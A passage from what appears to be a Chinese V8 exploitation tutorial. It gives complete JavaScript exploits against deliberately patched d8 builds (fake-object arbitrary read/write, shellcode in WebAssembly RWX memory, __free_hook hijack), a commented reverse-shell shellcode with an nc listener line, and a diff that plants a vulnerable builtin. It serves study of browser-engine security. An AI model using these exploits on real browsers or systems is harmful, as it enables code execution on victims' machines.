<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br></pre></td></tr></table></figure></div>
<p>写入 shellcode 并调用 <code>WebAssembly</code> 对应函数执行 shellcode 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// var shellcode=[</span></span><br><span class="line"><span class="comment">// 0x6a5f026a9958296an,</span></span><br><span class="line"><span class="comment">// 0xb9489748050f5e01n,</span></span><br><span class="line"><span class="comment">// 0x0100007f39300002n,</span></span><br><span class="line"><span class="comment">// 0x6a5a106ae6894851n,</span></span><br><span class="line"><span class="comment">// 0x485e036a050f582an,</span></span><br><span class="line"><span class="comment">// 0x75050f58216aceffn,</span></span><br><span class="line"><span class="comment">// 0x2fbb4899583b6af6n,</span></span><br><span class="line"><span class="comment">// 0x530068732f6e6962n,</span></span><br><span class="line"><span class="comment">// 0xe689485752e78948n,</span></span><br><span class="line"><span class="comment">// 0x000000000000050fn]</span></span><br><span class="line"><span class="comment">//nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="劫持-free-hook"><a href="#劫持-free-hook" class="headerlink" title="劫持 __free_hook"></a>劫持 __free_hook</h3><p>通过构造函数例如 <code>Array</code> 可以泄露 ELF 加载基址，进而通过 got 表泄露 libc 加载基址。<br>利用任意地址写修改 <code>__free_hook</code> 为 <code>system</code> 函数地址，之后 <code>print</code> 输出要执行的命令，在释放写有命令的堆块的时候实现任意命令执行。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3b004ce33229326fc2ddc8ce73b1b455.png"
                      alt="在这里插入图片描述"
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array_addr = <span class="title function_">addressOf</span>(<span class="title class_">Array</span>);</span><br><span class="line"><span class="keyword">var</span> elf_base = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">arbitrary_address_read</span>(array_addr - <span class="number">1n</span> + <span class="number">0x30n</span>) + <span class="number">0x41n</span>) - <span class="number">0xf8f680n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] elf base: &quot;</span> + <span class="title function_">hex</span>(elf_base));</span><br><span class="line"><span class="keyword">var</span> libc_base = <span class="title function_">arbitrary_address_read</span>(elf_base + <span class="number">0x1271b90n</span>) - <span class="number">0x7b0c0n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] libc base: &quot;</span> + <span class="title function_">hex</span>(libc_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x4f420n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="title function_">arbitrary_address_write</span>(free_hook_addr, system_addr);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;/snap/bin/gnome-calculator&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),       <span class="comment">//ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042319080808n</span>),<span class="comment">//type</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">addressOf</span>(fake_ab_mem) + <span class="number">0x58n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fakeObj</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x9090909090909090n</span>,</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// var shellcode=[</span></span><br><span class="line"><span class="comment">// 0x6a5f026a9958296an,</span></span><br><span class="line"><span class="comment">// 0xb9489748050f5e01n,</span></span><br><span class="line"><span class="comment">// 0x0100007f39300002n,</span></span><br><span class="line"><span class="comment">// 0x6a5a106ae6894851n,</span></span><br><span class="line"><span class="comment">// 0x485e036a050f582an,</span></span><br><span class="line"><span class="comment">// 0x75050f58216aceffn,</span></span><br><span class="line"><span class="comment">// 0x2fbb4899583b6af6n,</span></span><br><span class="line"><span class="comment">// 0x530068732f6e6962n,</span></span><br><span class="line"><span class="comment">// 0xe689485752e78948n,</span></span><br><span class="line"><span class="comment">// 0x000000000000050fn]</span></span><br><span class="line"><span class="comment">//nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>

<h1 id="Heap-Sandbox"><a href="#Heap-Sandbox" class="headerlink" title="Heap Sandbox"></a>Heap Sandbox</h1><h2 id="指针压缩"><a href="#指针压缩" class="headerlink" title="指针压缩"></a>指针压缩</h2><p>以 <code>ArrayBuffer</code> 为例，正常情况下的内存分布如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/84a55035a025b34164f79326f8796c9a.png"
                      alt="在这里插入图片描述"
                ><br>  在 V8 高版本中会基于数据 4GB 对齐所有指针高 32 位相同而只保留低 32 位而指针（类似于32位下的 HeapObject 指针），而基址存放在 r13 寄存器指向的内存中，从而节省空间。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2bb3db72d385bb5579b9a37487883e4f.png"
                      alt="在这里插入图片描述"
                ><br>因此 <code>ArrayBuffer</code> 的内存分布图如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/491e63bee3aaaeeac28f6f7d934998d8.png"
                      alt="在这里插入图片描述"
                ></p>
<p>  在地址泄露的时候可以将指针覆盖成 0 这样就可以泄露基址附近的数据，从而泄露基址。</p>
<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>指针压缩的方法虽然在一定程度上把任意地址读写限制在了 4GB 的 V8 堆的范围内，然而 V8 的某些对象比如 <code>ArrayBuffer</code> 中还存在不指向 V8 对象的指针（例如示例中的 <code>BackingStorage</code> 和 <code>ArrayBufferExtension</code>），这些指针不会被指针压缩所以依然可以实现任意地址读写，而沙箱的作用就是限制这些指针的任意地址读写范围。</p>
<p>在开启沙箱后 <code>ArrayBuffer</code> 的内存分布图如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/9538d4de1f255ac0725b01321b99bd5e.png"
                      alt="在这里插入图片描述"
                ><br>沙箱的具体实现方式有两种：</p>
<ul>
<li><p>一种是类似上图中的 <code>ArrayBufferExtension</code> 指针。在开启沙箱后，<code>ArrayBufferExtension</code> 存储的不再是堆地址，而是一个叫做 External Pointer Table 的表的下标，而在这个表的对应索引处存放着 <code>ArrayBufferExtension</code> 对应结构的地址和类型。这样攻击者就只能访问 <code>ArrayBufferExtension</code> 中存放的信息对应的结构而不能实现任意地址读写且不易实现类型混淆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/65caf838ed1c9b822d84de2c5345360d.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>另一种类似上图中的 <code>BackingStorage</code>。在开启沙箱后 <code>BackingStorage</code> 指针存放的是  <code>BackingStorage</code> 地址与沙箱基址偏移（40bit）左移 24bit 的结果。这个方式和指针压缩相同（实际上基址也相同），只不过访问范围变为 1TB 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/faca1aa32ed99db16311c6d4f54a6f24.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
</ul>
<p>因此沙箱的整体结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4ec6c1546af4bbefef120695be95d023.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ><br>实际的调试结果如下图所示，注意 rwx 段不在沙箱中，因此利用 <code>ArrayBuffer</code> 无法将 shellcode 写入 rwx 段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/f36c6062d602d751d82ae1ce88f43769.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><h3 id="利用立即数写-shellcode"><a href="#利用立即数写-shellcode" class="headerlink" title="利用立即数写 shellcode"></a>利用立即数写 shellcode</h3><p>这里以一个 demo 为例介绍这种沙箱绕过方法。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/sandbox_bypass/imm_shellcode" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>首先搭建环境：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">export PATH=$PATH:~/tools/depot_tools/</span><br><span class="line">gclient sync -D </span><br><span class="line">git apply ./sandbox.diff</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>sandbox.diff</code> 文件内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 49fe48d698..2944eb9edb 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -395,6 +395,25 @@ BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+BUILTIN(ArrayLen) &#123;</span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line">+  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+      isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; argLen;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+      isolate, argLen, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  uint32_t newLen = static_cast&lt;uint32_t&gt;(argLen-&gt;Number());</span><br><span class="line">+</span><br><span class="line">+  auto raw = *array;</span><br><span class="line">+  raw.set_length(Smi::FromInt(newLen));</span><br><span class="line">+  return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 859b5cee9a..a16a7d5ca1 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -392,6 +392,7 @@ namespace internal &#123;</span><br><span class="line">   CPP(ArrayPrototypeGroupToMap)                                                \</span><br><span class="line">   /* ES6 #sec-array.prototype.push */                                          \</span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line">+  CPP(ArrayLen)                                                                \</span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 #sec-array.prototype.shift */                                         \</span><br><span class="line">   CPP(ArrayShift)                                                              \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 5888a5cdab..5d13eac799 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1880,6 +1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayPush:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtin::kArrayLen:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayPrototypeReverse:</span><br><span class="line">     case Builtin::kArrayPrototypeSlice:</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index 7c7b917502..550b25d4ba 100644</span><br><span class="line">--- a/src/init/bootstrapper.cc</span><br><span class="line">+++ b/src/init/bootstrapper.cc</span><br><span class="line">@@ -1808,6 +1808,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;push&quot;, Builtin::kArrayPrototypePush,</span><br><span class="line">                           1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;len&quot;, 